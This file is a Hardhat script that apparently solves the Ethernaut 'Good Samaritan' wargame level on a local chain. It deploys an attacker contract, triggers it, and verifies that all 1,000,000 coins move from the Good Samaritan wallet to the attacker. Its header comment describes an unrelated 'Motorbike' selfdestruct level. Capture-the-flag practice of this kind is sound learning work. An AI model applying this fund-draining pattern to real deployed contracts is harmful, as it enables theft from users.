/*
  Would you be able to selfdestruct its engine and make the motorbike unusable ?
    selfdestruct the Engine contract
*/

const hre = require("hardhat");
const { expect } = require("chai")

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();
  
  let tx;
  let txReceipt;

  const GoodSamaritanContractAddress = "0xD50B9A723ed45189cAaB5Ba8083F090844595F6C";
  
  // Creating an instance of the GoodSamaritan contract
  this.goodSamaritan = await hre.ethers.getContractAt("GoodSamaritan",GoodSamaritanContractAddress);

  const CoinContractAddress = await this.goodSamaritan.coin();
  const WalletContractAddress = await this.goodSamaritan.wallet();

  // Creating an instance of the Coin contract
  this.coin = await hre.ethers.getContractAt("Coin",CoinContractAddress);

  // Creating an instance of the Wallet contract
  this.wallet = await hre.ethers.getContractAt("Wallet",WalletContractAddress);

  console.log(
    `
    GoodSamaritanContractAddress ${GoodSamaritanContractAddress} \n
    CoinContractAddress ${CoinContractAddress} \n
    WalletContractAddress ${WalletContractAddress} \n

    Good Samaritan's Wallet initial balance: ${await this.coin.balances(WalletContractAddress)}

    `
  );

  // Validating setups!
  expect(await this.goodSamaritan.coin()).to.eq(CoinContractAddress)
  expect(await this.goodSamaritan.wallet()).to.eq(WalletContractAddress)
  expect(await this.coin.balances(WalletContractAddress)).to.eq(1000000);

  // Deploying the Attacker contract
  console.log("Deploying the Attacker contract");
  const AttackGoodSamaritan = await hre.ethers.getContractFactory("AttackGoodSamaritan");
  this.attackGoodSamaritan = await AttackGoodSamaritan.connect(player).deploy(this.goodSamaritan.address);
  await this.attackGoodSamaritan.deployed();

  console.log("\n\n Performing attack ... \n\n");

  tx = await this.attackGoodSamaritan.connect(player).initiateAttack({gasLimit: 1000000});
  await tx.wait();

  // Validating attack results!
  expect(await this.coin.balances(WalletContractAddress)).to.eq(0);
  expect(await this.coin.balances(this.attackGoodSamaritan.address)).to.eq(1000000);

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

  console.log(
    `
    Results after performing the attack

    Good Samaritan's Wallet final balance: ${await this.coin.balances(WalletContractAddress)} \n
    Attacker's contract final balance: ${await this.coin.balances(this.attackGoodSamaritan.address)}
    `
  );


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});